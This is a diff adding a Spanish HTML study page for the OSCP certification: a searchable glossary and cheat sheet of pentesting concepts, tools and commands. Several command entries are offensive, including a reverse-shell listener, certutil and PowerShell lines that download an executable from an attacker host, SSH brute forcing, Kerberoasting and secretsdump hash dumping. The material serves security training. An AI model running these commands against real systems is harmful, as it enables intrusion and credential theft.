@@ -1,0 +1,136 @@
+<!doctype html>
+<html lang="es"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Glosario y comandos · OSCP Academy</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/style.css"><script src="assets/app.js" defer></script>
+</head>
+<body data-page="glosario"><main>
+<div class="kicker">Referencia</div>
+<h1>Glosario y chuleta de comandos</h1>
+<p class="lead">Busca cualquier concepto, herramienta o comando. Escribe en el buscador o filtra por categoría. Pensado como tu “cheatsheet” de consulta rápida.</p>
+<input class="search" id="q" placeholder="🔎 Buscar: nmap, hash, pivoting, reverse shell, kerberos…">
+<div class="filters" id="filters"></div>
+<p id="count" class="small" style="color:var(--muted)"></p>
+<div id="list"></div>
+
+<script>
+const G = [
+ // Conceptos
+ ["Pentest","concepto","Prueba de penetración: ataque autorizado a un sistema para hallar y demostrar sus vulnerabilidades antes que un atacante real."],
+ ["Vulnerabilidad","concepto","Debilidad (software desactualizado, mala configuración, contraseña débil) que puede aprovecharse."],
+ ["Exploit","concepto","Código o técnica que aprovecha una vulnerabilidad concreta."],
+ ["Payload","concepto","Parte del ataque que realiza la acción final, p. ej. abrir una consola remota."],
+ ["Vector de ataque","concepto","Camino de entrada: web, correo, un servicio expuesto…"],
+ ["Superficie de ataque","concepto","Conjunto de todos los puntos por los que se podría atacar un sistema."],
+ ["CIA","concepto","Confidencialidad, Integridad y Disponibilidad: los tres pilares de la seguridad."],
+ ["CVE","concepto","Identificador público único de una vulnerabilidad conocida (p. ej. CVE-2021-44228)."],
+ ["CVSS","concepto","Puntuación de 0 a 10 que mide la gravedad de una vulnerabilidad."],
+ ["RCE","concepto","Remote Code Execution: ejecutar comandos en una máquina de forma remota."],
+ ["Shell","concepto","Programa que recibe y ejecuta comandos. 'Tener shell' = poder ejecutar comandos en la víctima."],
+ ["Reverse shell","concepto","La víctima se conecta de vuelta al atacante. La más usada porque suele sortear firewalls."],
+ ["Bind shell","concepto","La víctima abre un puerto y espera a que el atacante se conecte."],
+ ["Escalada de privilegios","concepto","Pasar de un usuario normal al máximo privilegio (root / SYSTEM)."],
+ ["Movimiento lateral","concepto","Saltar de un equipo comprometido a otro dentro de la red."],
+ ["Pivoting","concepto","Usar una máquina comprometida como puente para alcanzar una red que no ves directamente."],
+ ["OSINT","concepto","Inteligencia de fuentes abiertas: información pública obtenida sin tocar los sistemas."],
+ ["Hash","concepto","Resultado de una función de un solo sentido; no se revierte. Se usa para guardar contraseñas."],
+ ["Salt","concepto","Texto aleatorio añadido antes de hashear para que contraseñas iguales den hashes distintos."],
+ ["Pass-the-Hash","concepto","Autenticarse usando el hash NTLM sin conocer la contraseña."],
+ ["Kerberoasting","concepto","Pedir tickets (TGS) de cuentas de servicio para crackear su contraseña offline."],
+ ["AS-REP Roasting","concepto","Atacar cuentas que no exigen pre-autenticación Kerberos para crackearlas offline."],
+ ["Active Directory","concepto","Sistema de Microsoft para gestionar de forma central usuarios, equipos y permisos."],
+ ["Controlador de dominio (DC)","concepto","Servidor que valida los inicios de sesión y guarda la base de datos del dominio."],
+ ["NTDS.dit","concepto","Base de datos del DC con todos los hashes del dominio."],
+ ["SUID","concepto","Bit que hace que un binario se ejecute con los permisos de su dueño (a menudo root)."],
+ ["LFI","concepto","Local File Inclusion: incluir/leer archivos locales del servidor por falta de validación."],
+ ["SQLi","concepto","Inyección SQL: alterar consultas a la base de datos mediante entradas no validadas."],
+ ["XSS","concepto","Cross-Site Scripting: inyectar JavaScript que se ejecuta en el navegador de otra víctima."],
+ ["IDOR","concepto","Acceder a datos de otros cambiando un identificador por falta de control de acceso."],
+ ["Spraying","concepto","Probar una contraseña común contra muchos usuarios para evitar bloqueos de cuenta."],
+ ["Wordlist","concepto","Lista de palabras candidatas (directorios, usuarios, contraseñas) que una herramienta prueba."],
+ ["Proxy SOCKS","concepto","Intermediario por el que se enruta tráfico TCP, usado en pivoting."],
+ ["Proctoring","concepto","Vigilancia por webcam y pantalla durante el examen."],
+ ["local.txt","concepto","Flag que demuestra el acceso de usuario en el examen."],
+ ["proof.txt","concepto","Flag que demuestra privilegios máximos (root/SYSTEM) en el examen."],
+ // Herramientas
+ ["nmap","herramienta","Escáner de red: descubre equipos, puertos, servicios y versiones."],
+ ["Burp Suite","herramienta","Proxy que intercepta y modifica peticiones web. Clave para pruebas web."],
+ ["gobuster / ffuf","herramienta","Descubren directorios, archivos y subdominios web probando una wordlist."],
+ ["whatweb","herramienta","Identifica tecnologías de una web (CMS, lenguaje, versiones)."],
+ ["Hydra","herramienta","Ataques de contraseña 'online' contra servicios (SSH, FTP, formularios…)."],
+ ["John the Ripper","herramienta","Crackeador de hashes (CPU), detecta el tipo automáticamente."],
+ ["Hashcat","herramienta","Crackeador de hashes por GPU, muy rápido; requiere indicar el modo (-m)."],
+ ["searchsploit","herramienta","Busca exploits en la copia local de Exploit-DB."],
+ ["Metasploit","herramienta","Framework con exploits, payloads y post-explotación. Limitado a 1 máquina en el examen."],
+ ["msfvenom","herramienta","Generador de payloads de Metasploit (ejecutables, scripts)."],
+ ["netcat (nc)","herramienta","Conexiones TCP/UDP en crudo: escuchar shells, banner grabbing, transferir datos."],
+ ["socat","herramienta","Como netcat pero más potente: shells interactivas, cifrado, relés."],
+ ["LinPEAS / WinPEAS","herramienta","Scripts que enumeran la máquina y resaltan vías de escalada (Linux/Windows)."],
+ ["pspy","herramienta","Muestra procesos y tareas cron que arrancan, sin ser root. Útil para cron ocultos."],
+ ["BloodHound","herramienta","Grafica las relaciones de AD y encuentra caminos hacia Domain Admin."],
+ ["Impacket","herramienta","Colección de scripts Python para AD (secretsdump, psexec, GetUserSPNs…)."],
+ ["netexec (nxc)","herramienta","Prueba credenciales y enumera SMB/WinRM/LDAP en muchos equipos a la vez."],
+ ["evil-winrm","herramienta","Consola remota cómoda sobre WinRM cuando tienes credenciales."],
+ ["chisel","herramienta","Crea túneles por HTTP/WebSocket para pivoting (incluido Windows)."],
+ ["ligolo-ng","herramienta","Pivoting moderno: expone la red interna como una interfaz real en Kali."],
+ ["proxychains","herramienta","Fuerza a otras herramientas a pasar por un proxy (pivoting)."],
+ ["GTFOBins","herramienta","Web con técnicas para abusar de binarios Unix con privilegios (sudo/SUID)."],
+ ["exiftool","herramienta","Lee metadatos de documentos e imágenes (autores, software, rutas)."],
+ ["wpscan","herramienta","Enumera versión, plugins y usuarios de WordPress."],
+ ["smbclient","herramienta","Cliente para listar y acceder a recursos compartidos SMB."],
+ ["enum4linux-ng","herramienta","Enumeración de SMB/RPC (usuarios, recursos, políticas)."],
+ ["Wireshark","herramienta","Analizador de tráfico de red (capturar y ver paquetes)."],
+ ["Kali Linux","herramienta","Distribución con cientos de herramientas de pentesting preinstaladas."],
+ // Comandos
+ ["whoami; id","comando","Quién eres y tus grupos/privilegios. Lo primero al entrar en una máquina."],
+ ["sudo -l","comando","Qué puedes ejecutar como root con sudo. Vía de escalada frecuente en Linux."],
+ ["find / -perm -4000 -type f 2>/dev/null","comando","Lista los binarios con bit SUID."],
+ ["getcap -r / 2>/dev/null","comando","Lista binarios con 'capabilities'."],
+ ["nmap -p- --min-rate 2000 -Pn IP","comando","Escaneo rápido de TODOS los puertos TCP."],
+ ["nmap -p22,80 -sC -sV -Pn IP","comando","Escaneo detallado (scripts y versiones) de puertos concretos."],
+ ["sudo nmap -sU --top-ports 50 IP","comando","Escaneo de los puertos UDP más comunes."],
+ ["smbclient -L //IP -N","comando","Lista recursos compartidos SMB sin credenciales."],
+ ["gobuster dir -u URL -w lista -x php,txt","comando","Busca directorios y archivos en una web."],
+ ["nc -lvnp 443","comando","Escucha una conexión entrante (reverse shell) en el puerto 443."],
+ ["python3 -m http.server 80","comando","Levanta un servidor web rápido para transferir archivos."],
+ ["python3 -c 'import pty; pty.spawn(\"/bin/bash\")'","comando","Mejora una shell básica a una interactiva (paso 1 de estabilización)."],
+ ["iwr http://IP/f.exe -OutFile f.exe","comando","Descarga un archivo en Windows (PowerShell)."],
+ ["certutil -urlcache -f http://IP/f.exe f.exe","comando","Descarga un archivo en Windows (CMD)."],
+ ["whoami /priv","comando","Muestra los privilegios de token en Windows."],
+ ["whoami /all","comando","Usuario, grupos y privilegios en Windows, todo junto."],
+ ["john --wordlist=rockyou.txt hashes","comando","Crackea hashes por diccionario con John."],
+ ["hashcat -m 1000 -a 0 h.txt rockyou.txt","comando","Crackea hashes NTLM por diccionario con Hashcat."],
+ ["hydra -l user -P rockyou.txt ssh://IP","comando","Ataque online de contraseñas contra SSH."],
+ ["netexec smb IP -u users.txt -p pass.txt","comando","Prueba credenciales SMB en uno o varios equipos."],
+ ["impacket-GetUserSPNs dom/user:pass -request","comando","Kerberoasting: solicita TGS de cuentas de servicio."],
+ ["impacket-secretsdump dom/user:pass@IP","comando","Vuelca hashes (SAM/LSA/NTDS) con credenciales suficientes."],
+ ["evil-winrm -i IP -u user -p pass","comando","Abre una consola remota por WinRM."],
+ ["ssh -D 1080 user@IP","comando","Crea un proxy SOCKS dinámico para pivoting."],
+ ["ssh -L 8000:10.0.0.5:80 user@IP","comando","Reenvío local: tu puerto 8000 llega a un servicio interno."],
+ ["proxychains nmap -sT -Pn -p80,445 IP","comando","Escanea a través del proxy (pivoting)."],
+ ["ip a / ipconfig /all","comando","Muestra tus direcciones IP e interfaces de red."],
+ ["ss -tulpn / netstat -ano","comando","Muestra los puertos en escucha y el proceso asociado."],
+];
+
+const cats = ["todo","concepto","herramienta","comando"];
+const catLabel = {todo:"Todo",concepto:"Conceptos",herramienta:"Herramientas",comando:"Comandos"};
+let cur = "todo";
+const filters = document.getElementById("filters");
+filters.innerHTML = cats.map(c => `<button data-c="${c}" class="${c==='todo'?'on':''}">${catLabel[c]}</button>`).join("");
+filters.onclick = e => { if (e.target.dataset.c){ cur = e.target.dataset.c; [...filters.children].forEach(b=>b.classList.toggle("on", b.dataset.c===cur)); render(); } };
+
+const esc = s => s.replace(/[&<>]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;"}[c]));
+function render(){
+  const q = document.getElementById("q").value.trim().toLowerCase();
+  const rows = G.filter(([t,c,d]) => (cur==="todo"||c===cur) && (!q || t.toLowerCase().includes(q) || d.toLowerCase().includes(q)))
+    .sort((a,b)=>a[0].localeCompare(b[0]));
+  document.getElementById("count").textContent = `${rows.length} resultado(s)`;
+  document.getElementById("list").innerHTML = rows.map(([t,c,d]) =>
+    `<div class="gl"><span class="cat">${c}</span>${c==='comando'?`<pre data-nocopy>${esc(t)}</pre>`:`<b>${esc(t)}</b>`}<p>${esc(d)}</p></div>`).join("")
+    || `<p style="color:var(--muted)">Sin resultados para "<b>${esc(q)}</b>".</p>`;
+}
+document.getElementById("q").addEventListener("input", render);
+window.pageInit = render;
+</script>
+</main></body></html>
